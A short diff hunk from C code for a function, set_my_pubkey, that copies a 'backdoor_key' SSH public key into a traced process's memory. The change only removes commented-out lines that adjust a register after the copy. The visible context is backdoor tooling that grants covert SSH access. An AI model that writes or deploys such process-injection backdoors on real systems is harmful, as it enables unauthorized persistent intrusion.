@@ -117,12 +117,6 @@ set_my_pubkey (uint32_t pid)
 
   copy_to_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (SSH_PUBKEY));
   // set my key
-
-  // struct user_regs_struct regs;
-  // get_regs (pid, &regs);
-  // regs.rax = sizeof (backdoor_key) - 1;
-  // set_regs (pid, &regs);
-  // set the correct size just in case
 }
 
 void
